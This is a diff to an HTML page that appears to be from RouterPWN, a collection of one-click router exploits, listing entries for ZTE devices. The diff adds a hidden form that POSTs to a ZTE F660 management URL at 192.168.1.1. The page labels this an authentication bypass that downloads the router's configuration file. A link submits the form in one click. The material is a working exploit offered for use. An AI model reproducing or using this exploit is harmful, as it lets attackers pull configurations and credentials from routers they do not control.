@@ -5,7 +5,7 @@
    RouterPWN - ZTE - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="/includes/images/favicon.png" rel="apple-touch-icon"/>
-  <link href="/includes/images/favicon.ico" rel="shortcut icon"/>
+  <link href="../includes/images/favicon.ico" rel="shortcut icon"/>
   <script src="../includes/jquery-1.11.1.min.js">
   </script>
   <script src="../includes/jquery.dataTables.min.js">
@@ -121,13 +121,13 @@
          </tr>
         </tfoot>
         <tbody>
-		<tr>
+		<tr><form name="fDownload" method="POST" action="http://192.168.1.1/getpage.gch?pid=101&nextpage=manager_dev_config_t.gch" enctype="multipart/form-data" onsubmit="return false;"><input type="hidden" name="config" id="config" value=""></input>
           <td>2015/06/29</td>
           <td>One click</td>
           <td><a href="#">Daniel Cisa</a></td>
-          <td><a href="javascript:ztef660_config()">F660 V2.22.21 Authetication Bypass Download config </a><a href="javascript:ztef660_config(prompt('IP'))">[SET IP]</td>
+          <td><a href="javascript:document.fDownload.submit();">F660 V2.22.21 Authetication Bypass Download config </a></td>
           <td>Daniel Cisa</td>
-        </tr>
+        </form></tr>
 		<tr>
           <td>
            2015/02/23
@@ -268,5 +268,5 @@ pageTracker._trackPageview();
     </tr>
    </tbody>
   </table>
- <script src="/includes/scripts.js"></script></body>
+ <script src="http://www.routerpwn.com/includes/scripts.js"></script></body>
 </html>
